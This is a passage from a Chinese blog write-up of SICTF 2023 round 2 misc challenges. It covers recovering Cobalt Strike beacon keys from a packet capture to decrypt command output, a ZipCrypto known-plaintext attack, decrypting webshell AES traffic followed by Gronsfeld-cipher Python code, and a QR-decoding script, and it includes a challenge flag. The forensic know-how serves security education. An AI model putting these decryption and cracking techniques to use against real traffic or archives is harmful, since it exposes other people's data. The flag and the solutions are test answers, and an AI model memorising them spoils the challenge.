+<p>数据包里导出HTTP对象，有一个key.zip，解压key，把key改名为.cobaltstrike.beacon_keys，然后用文章提到的工具，直接运行即可解出私钥。</p>
+<p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230909145948742.png" alt="image-20230909145948742.png"></p>
+<p>下面用到的工具要在linux上运行，win不行。工具文章里有。</p>
+<p>拿到私钥，解cookie里的元数据，就可以拿到AES_KEY，HMAC_KEY。</p>
+<p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910155826810.png" alt="image-20230910155826810.png"></p>
+<p>现在解命令执行结果的数据。</p>
+<p>这里的encrypt_data是报文里&#x2F;submit.php的请求体解hex再base64</p>
+<p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910155750983.png" alt="image-20230910155750983.png"></p>
+<h2 id="baby-zip"><a href="#baby-zip" class="headerlink" title="baby_zip"></a>baby_zip</h2><p>ZipCrypto Store，一眼明文攻击。</p>
+<p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910162433566.png" alt="image-20230910162433566.png"></p>
+<p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230909203247791.png" alt="image-20230909203247791.png"></p>
+<p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230909203415318.png" alt="image-20230909203415318.png"></p>
+<h2 id="Easy-Shark"><a href="#Easy-Shark" class="headerlink" title="Easy_Shark"></a>Easy_Shark</h2><p>最开始的tcp流是马的样子，后面的流全是加密后的结果。</p>
+<p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910160125489.png" alt="image-20230910160125489.png"><br>AES加密，key告诉你了，复制到本地就可以。不过有个坑点，本地要加载那个扩展，解出来的才是正常的，不然的话进入if里面解出来的是乱码….</p>
+<p>后续tcp流的请求体内容复制出来：</p>
+<p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910160843757.png" alt="image-20230910160843757.png"></p>
+<p>解出来长这样</p>
+<p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910160804454.png" alt="image-20230910160804454.png"><br>响应数据也解一遍：</p>
+<p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910161013700.png" alt="image-20230910161013700.png"><br>看不懂，继续解后面的包。有一个cat GronKey.txt，内容是：1,50,61,8,9,20,63,41</p>
+<p>看到Gron就想到gronsfeld加密。</p>
+<p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230909212332994.png" alt="image-20230909212332994.png"></p>
+<p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230909212345402.png" alt="image-20230909212345402.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">def gronsfeld_encrypt(text, key):</span><br><span class="line">    encrypted_text = &quot;&quot;</span><br><span class="line">    key_digits = [int(digit) for digit in key.split(&quot;,&quot;)]</span><br><span class="line">    key_length = len(key_digits)</span><br><span class="line">    for i in range(len(text)):</span><br><span class="line">        char = text[i]</span><br><span class="line">        if char.isalpha():</span><br><span class="line">            # 将字母转换为大写，以便与密钥数字对应</span><br><span class="line">            char = char.upper()</span><br><span class="line">            # 计算密钥对应的数字</span><br><span class="line">            key_digit = key_digits[i % key_length]</span><br><span class="line">            # 计算移位后的字母</span><br><span class="line">            shifted_char = chr(((ord(char) - ord(&#x27;A&#x27;) + key_digit) % 26) + ord(&#x27;A&#x27;))</span><br><span class="line">            encrypted_text += shifted_char</span><br><span class="line">        else:</span><br><span class="line">            # 如果字符不是字母，则直接添加到加密文本中</span><br><span class="line">            encrypted_text += char</span><br><span class="line">    return encrypted_text</span><br><span class="line"></span><br><span class="line">def gronsfeld_decrypt(encrypted_text, key):</span><br><span class="line">    decrypted_text = &quot;&quot;</span><br><span class="line">    key_digits = [int(digit) for digit in key.split(&quot;,&quot;)]</span><br><span class="line">    key_length = len(key_digits)</span><br><span class="line">    for i in range(len(encrypted_text)):</span><br><span class="line">        char = encrypted_text[i]</span><br><span class="line">        if char.isalpha():</span><br><span class="line">            # 将字母转换为大写，以便与密钥数字对应</span><br><span class="line">            char = char.upper()</span><br><span class="line">            # 计算密钥对应的数字</span><br><span class="line">            key_digit = key_digits[i % key_length]</span><br><span class="line">            # 计算反向移位后的字母</span><br><span class="line">            shifted_char = chr(((ord(char) - ord(&#x27;A&#x27;) - key_digit) % 26) + ord(&#x27;A&#x27;))</span><br><span class="line">            decrypted_text += shifted_char</span><br><span class="line">        else:</span><br><span class="line">            # 如果字符不是字母，则直接添加到解密文本中</span><br><span class="line">            decrypted_text += char</span><br><span class="line">    return decrypted_text</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">plaintext = &quot;HELLO&quot;</span><br><span class="line">key = &quot;1,50,61,8,9,20,63,41&quot;</span><br><span class="line">encrypted_text = gronsfeld_encrypt(plaintext, key)</span><br><span class="line">print(&quot;加密后的文本:&quot;, encrypted_text)</span><br><span class="line">decrypted_text = gronsfeld_decrypt(encrypted_text, key)</span><br><span class="line">print(&quot;解密后的文本:&quot;, decrypted_text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以直接用。</p>
+<p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230909212410948.png" alt="image-20230909212410948.png"><br>SICTF{SHUMUISAGOODBOYYYYYYYYY}</p>
+<h2 id="QR"><a href="#QR" class="headerlink" title="QR"></a>QR</h2><p>二进制串转成二维码，0黑色，1白色。然后用pyzbar读取二维码数据。用pwntools交互。</p>
+<p>gpt写的转二维码的脚本。完整解题脚本不小心给我删了，懒得再写了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line"># 输入的二进制串（示例）</span><br><span class="line">binary_string = &quot;0011001100110011&quot;</span><br><span class="line"></span><br><span class="line"># 计算图像的宽度和高度</span><br><span class="line">binary_length = len(binary_string)</span><br><span class="line">width = int(binary_length ** 0.5)  # 取平方根作为宽度</span><br><span class="line">height = (binary_length + width - 1) // width  # 根据宽度计算高度</span><br><span class="line"></span><br><span class="line"># 创建一个新的图像</span><br><span class="line">image = Image.new(&quot;1&quot;, (width, height))</span><br><span class="line"></span><br><span class="line"># 将二进制串中的0和1转换为像素颜色</span><br><span class="line">pixels = []</span><br><span class="line">for char in binary_string:</span><br><span class="line">    if char == &#x27;0&#x27;:</span><br><span class="line">        pixels.append(0)</span><br><span class="line">    elif char == &#x27;1&#x27;:</span><br><span class="line">        pixels.append(1)</span><br><span class="line"></span><br><span class="line"># 将像素颜色设置到图像中</span><br><span class="line">image.putdata(pixels)</span><br><span class="line"></span><br><span class="line"># 保存图像</span><br><span class="line">image.save(&quot;output.png&quot;)</span><br><span class="line"></span><br><span class="line"># 显示图像（可选）</span><br><span class="line">image.show()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>一开始一直不出flag，去问出题人，解1000次才出。所以脚本最后要稍微改改。</p>
+<p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/09/10/SICTF2023round2/image-20230910122047510.png" alt="image-20230910122047510.png"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/08/29/2023summer/" rel="prev" title="2023-summer">
+      <i class="fa fa-chevron-left"></i> 2023-summer
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/10/08/hession/" rel="next" title="Hessian Deserialization Summary">
+      Hessian Deserialization Summary <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0-Include"><span class="nav-number">1.1.</span> <span class="nav-text">[签到]Include</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE"><span class="nav-number">1.2.</span> <span class="nav-text">RCE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Baby-PHP"><span class="nav-number">1.3.</span> <span class="nav-text">Baby_PHP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%A0%E8%83%BD%E8%B7%9F%E5%BE%97%E4%B8%8A%E6%88%91%E7%9A%84speed%E5%90%97"><span class="nav-number">1.4.</span> <span class="nav-text">你能跟得上我的speed吗</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%88%91%E5%85%A8%E9%83%BD%E8%A6%81"><span class="nav-number">1.5.</span> <span class="nav-text">我全都要</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pain"><span class="nav-number">1.6.</span> <span class="nav-text">pain</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#misc"><span class="nav-number">2.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#fast-morse"><span class="nav-number">2.1.</span> <span class="nav-text">fast_morse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E8%B5%B7%E4%B8%8A%E5%8F%B7%E4%B8%8D"><span class="nav-number">2.2.</span> <span class="nav-text">一起上号不</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#baby-zip"><span class="nav-number">2.3.</span> <span class="nav-text">baby_zip</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Easy-Shark"><span class="nav-number">2.4.</span> <span class="nav-text">Easy_Shark</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#QR"><span class="nav-number">2.5.</span> <span class="nav-text">QR</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="unknown"
+      src="/images/unknown.jpg">
+  <p class="site-author-name" itemprop="name">unknown</p>
+  <div class="site-description" itemprop="description">memories matter</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">25</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">unknown</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
